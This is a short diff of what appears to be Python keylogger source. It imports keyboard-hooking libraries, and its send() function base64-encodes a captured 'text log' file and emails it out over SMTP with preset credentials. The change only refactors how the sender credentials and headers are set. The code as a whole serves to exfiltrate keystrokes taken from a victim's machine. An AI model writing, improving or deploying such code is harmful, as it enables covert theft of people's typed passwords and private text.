@@ -7,18 +7,20 @@ import pythoncom, pyHook
 from datetime import datetime
 
 def send():
-    subj = 'User\'s report {}'.format(str(datetime.now()).split('.')[0])
+    user=''
+    pwd=''
     to = ''
+    subj = 'User\'s report {}'.format(str(datetime.now()).split('.')[0])
     data = base64.b64encode(open('not.note', 'r+').read())
     body = '\r\n'.join((
-        'From: %s' % user,
-        'To: %s' % to,
-        'Subject: %s' % subj,
+        'From: {}'.format(user),
+        'To: {}'.format(to),
+        'Subject: {}'.format(subj),
         '',
         'Hello, sir!\nHere is a text log\n\n{}\n\nGood luck!'.format(data)
     ))
     server = smtplib.SMTP('smtp.mail.com:25')
-    server.login(user='', pwd='')
+    server.login(user, pwd)
     server.sendmail(user, [to], body)
     server.close()
 
